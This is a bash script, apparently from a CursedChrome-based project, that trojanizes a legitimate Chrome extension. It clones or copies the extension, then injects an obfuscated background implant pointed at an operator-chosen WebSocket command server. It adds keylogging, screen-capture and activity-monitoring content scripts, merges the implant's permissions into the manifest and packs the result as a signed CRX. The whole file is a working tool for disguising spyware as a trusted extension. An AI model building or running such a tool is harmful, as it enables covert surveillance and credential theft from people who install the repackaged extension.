#!/usr/bin/env bash
set -euo pipefail
trap 'rm -f temp_manifest.json temp_script.js' EXIT

# Suggested REPO_LIST
REPO_LIST=(
    "https://github.com/gildas-lormeau/SingleFile"
    ""
)

# Local project directories
LOCAL_PROJECTS=(
    "bypass-paywalls-chrome"
    "cookie-sync-extension"
)

# Default values
RANDOM_INDEX=$((RANDOM % $((${#REPO_LIST[@]} / 2)) * 2))
DEFAULT_REPO_URL=${REPO_LIST[$RANDOM_INDEX]}
DEFAULT_REPO_NAME=$(basename "$DEFAULT_REPO_URL" .git)
DEFAULT_EXTENSION_PATH=${REPO_LIST[$((RANDOM_INDEX + 1))]}
DEFAULT_LOCAL_PROJECT="${LOCAL_PROJECTS[0]}"
DEFAULT_WS_ADDRESS="ws://127.0.0.1:4343"
DESTINATION_FOLDER="external_extension"
DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$DEFAULT_REPO_NAME"
USE_LOCAL_PROJECT=false

# Source files from CursedChrome implant
INJECT_BG_SCRIPT="extension/src/bg/background.js"
ORIGINAL_MANIFEST="extension/manifest.json"

# All files that need to be copied into the target extension
EXTRA_FILES=(
    "extension/src/content/keyboard-monitor.js"
    "extension/src/content/screen-capture.js"
    "extension/src/content/activity-monitor.js"
    "extension/src/offscreen/offscreen.js"
    "extension/src/offscreen/offscreen.html"
    "extension/redirect-hack.html"
)

# Check dependencies
check_dependencies() {
    local missing_deps=()
    for dep in git jq javascript-obfuscator openssl; do
        if ! command -v "$dep" &>/dev/null; then
            missing_deps+=("$dep")
        fi
    done

    if [ ${#missing_deps[@]} -ne 0 ]; then
        echo "Error: Missing dependencies: ${missing_deps[*]}"
        exit 1
    fi
}

prompt_for_input() {
    local prompt="$1"
    local default="$2"
    local user_input
    read -r -p "$prompt [$default]: " user_input
    echo "${user_input:-$default}"
}

prompt_yes_no() {
    local prompt="$1"
    local response
    read -r -p "$prompt (y/n): " response
    [[ "$response" =~ ^[Yy]$ ]]
}

clone_repository() {
    local target_dir="$DESTINATION_FOLDER_NAME"
    local temp_dir="$DESTINATION_FOLDER/temp_$DEFAULT_REPO_NAME"

    if [ ! -d "$target_dir" ]; then
        echo "Cloning repository..."
        mkdir -p "$temp_dir"
        git clone "$REPO_URL" "$temp_dir"

        if [ -n "$EXTENSION_PATH" ]; then
            mkdir -p "$target_dir"
            cp -r "$temp_dir/$EXTENSION_PATH"/* "$target_dir/"
        else
            mkdir -p "$target_dir"
            cp -r "$temp_dir"/* "$target_dir/"
        fi
        rm -rf "$temp_dir"
    else
        echo "Repository already exists, skipping clone."
    fi
}

copy_local_project() {
    local source_dir="$LOCAL_PROJECT_PATH"
    local target_dir="$DESTINATION_FOLDER_NAME"

    if [ ! -d "$source_dir" ]; then
        echo "Error: Local project directory not found: $source_dir"
        exit 1
    fi

    echo "Copying local project from $source_dir..."
    mkdir -p "$DESTINATION_FOLDER"

    if [ -d "$target_dir" ]; then
        echo "Target directory already exists, removing it..."
        rm -rf "$target_dir"
    fi

    cp -r "$source_dir" "$target_dir"
    echo "Local project copied successfully."
}

inject_script() {
    local target_file="$DESTINATION_FOLDER_NAME/src/bg/background.js"
    mkdir -p "$(dirname "$target_file")"

    echo "Obfuscating background script..."

    # Add Service Worker polyfill at the beginning
    cat > temp_script.js << 'EOF'
// Service Worker polyfill for obfuscated code
if (typeof window === 'undefined') {
    self.window = self;
}

EOF

    # Append the actual script with WS address replaced
    sed "s|$DEFAULT_WS_ADDRESS|$WS_ADDRESS|g" "$INJECT_BG_SCRIPT" >> temp_script.js

    # Use Service Worker compatible obfuscation options
    javascript-obfuscator temp_script.js --output "$target_file" \
        --compact true \
        --self-defending false \
        --disable-console-output true \
        --target browser \
        --string-array true \
        --string-array-threshold 0.75 \
        --string-array-encoding 'base64' \
        --split-strings true \
        --split-strings-chunk-length 10

    rm temp_script.js
}

copy_extra_files() {
    for file in "${EXTRA_FILES[@]}"; do
        if [ -f "$file" ]; then
            # Mirror the structure: extension/src/content/foo.js -> target/src/content/foo.js
            # Remove 'extension/' prefix from the file path to get relative path in target
            local rel_path="${file#extension/}"
            local target="$DESTINATION_FOLDER_NAME/$rel_path"
            mkdir -p "$(dirname "$target")"
            cp "$file" "$target"
            echo "Copied: $rel_path"
        else
            echo "Warning: File not found: $file"
        fi
    done
}

update_manifest() {
    local manifest="$DESTINATION_FOLDER_NAME/manifest.json"
    local temp_manifest="temp_manifest.json"
    local manifest_version=$(jq -r '.manifest_version' "$manifest")

    echo "Updating manifest (V$manifest_version)..."

    # 1. Merge Permissions
    local common_permissions=$(jq '.permissions // []' "$ORIGINAL_MANIFEST")
    jq --argjson p "$common_permissions" '.permissions = ((.permissions // []) + $p) | .permissions |= unique' "$manifest" > "$temp_manifest" && mv "$temp_manifest" "$manifest"

    # 2. Merge Content Scripts
    local implant_content_scripts=$(jq '.content_scripts' "$ORIGINAL_MANIFEST")
    jq --argjson cs "$implant_content_scripts" '.content_scripts = ((.content_scripts // []) + $cs)' "$manifest" > "$temp_manifest" && mv "$temp_manifest" "$manifest"

    # 3. Handle Background/Service Worker
    if [ "$manifest_version" -eq 2 ]; then
        # V2: Append our scripts to background.scripts
        local extra_bg='["src/bg/background.js"]'
        jq --argjson scripts "$extra_bg" '.background.scripts = ((.background.scripts // []) + $scripts) | .background.persistent = true' "$manifest" > "$temp_manifest"
    else
        # V3: Handle Service Worker
        local target_sw=$(jq -r '.background.service_worker // empty' "$manifest")
        local is_module=$(jq -r '.background.type // empty' "$manifest")
        local new_sw="src/bg/service_worker_wrapper.js"

        {
            echo "// CursedChrome Loader"
            if [ "$is_module" == "module" ]; then
                echo "import './background.js';"
                [ -n "$target_sw" ] && echo "import '../../$target_sw';"
            else
                echo "importScripts('background.js');"
                [ -n "$target_sw" ] && echo "importScripts('../../$target_sw');"
            fi
        } > "$DESTINATION_FOLDER_NAME/src/bg/service_worker_wrapper.js"

        jq --arg sw "$new_sw" '.background.service_worker = $sw' "$manifest" > "$temp_manifest"
        
        # Merge Host Permissions for V3
        local hp=$(jq '.host_permissions // []' "$ORIGINAL_MANIFEST")
        jq --argjson hp "$hp" '.host_permissions = ((.host_permissions // []) + $hp) | .host_permissions |= unique' "$temp_manifest" > "$temp_manifest.2"
        mv "$temp_manifest.2" "$temp_manifest"
    fi
    mv "$temp_manifest" "$manifest"

    # 4. Web Accessible Resources (for redirect hacks etc)
    local war=$(jq '.web_accessible_resources // []' "$ORIGINAL_MANIFEST")
    if [ "$manifest_version" -eq 3 ]; then
        jq --argjson war "$war" '.web_accessible_resources = ((.web_accessible_resources // []) + $war)' "$manifest" > "$temp_manifest"
    else
        jq --argjson war '["redirect-hack.html", "src/bg/window-polyfill.js"]' '.web_accessible_resources = ((.web_accessible_resources // []) + $war)' "$manifest" > "$temp_manifest"
    fi
    mv "$temp_manifest" "$manifest"
}

create_crx() {
    local crx_file="${DESTINATION_FOLDER}-injected.crx"
    local pem_file="${DESTINATION_FOLDER}-injected.pem"
    local extension_dir="$DESTINATION_FOLDER_NAME"

    local browser_cmd
    for cmd in chromium chromium-browser google-chrome "Google Chrome"; do
        if command -v "$cmd" &>/dev/null; then browser_cmd="$cmd"; break; fi
    done

    if [ -z "${browser_cmd:-}" ]; then
        echo "Warning: Chrome/Chromium not found. Skipping CRX creation."
        return
    fi

    [ ! -f "$pem_file" ] && openssl genrsa -out "$pem_file" 2048
    "$browser_cmd" --pack-extension="$extension_dir" --pack-extension-key="$pem_file"
    mv "${extension_dir}.crx" "$crx_file" 2>/dev/null || echo "CRX creation failed (expected if no GUI/Chrome sandbox issues)"
}

# Execution
check_dependencies

echo "=== CursedChrome Extension Injection ==="
echo ""
echo "Available local projects:"
for i in "${!LOCAL_PROJECTS[@]}"; do
    echo "  $((i+1)). ${LOCAL_PROJECTS[$i]}"
done
echo ""

if prompt_yes_no "Use local project instead of cloning from remote?"; then
    USE_LOCAL_PROJECT=true
    LOCAL_PROJECT_PATH=$(prompt_for_input "Enter local project path" "$DEFAULT_LOCAL_PROJECT")

    # Set destination folder name based on local project
    PROJECT_NAME=$(basename "$LOCAL_PROJECT_PATH")
    DESTINATION_FOLDER_NAME="$DESTINATION_FOLDER/$PROJECT_NAME"

    WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")

    copy_local_project
else
    REPO_URL=$(prompt_for_input "Enter the repository URL" "$DEFAULT_REPO_URL")
    WS_ADDRESS=$(prompt_for_input "Enter the WebSocket address" "$DEFAULT_WS_ADDRESS")
    EXTENSION_PATH=$(prompt_for_input "Enter the extension path" "$DEFAULT_EXTENSION_PATH")

    clone_repository
fi

inject_script
copy_extra_files
update_manifest
create_crx

echo ""
echo "=== Injection Complete ==="
echo "Target directory: $DESTINATION_FOLDER_NAME"
echo "WebSocket address: $WS_ADDRESS"
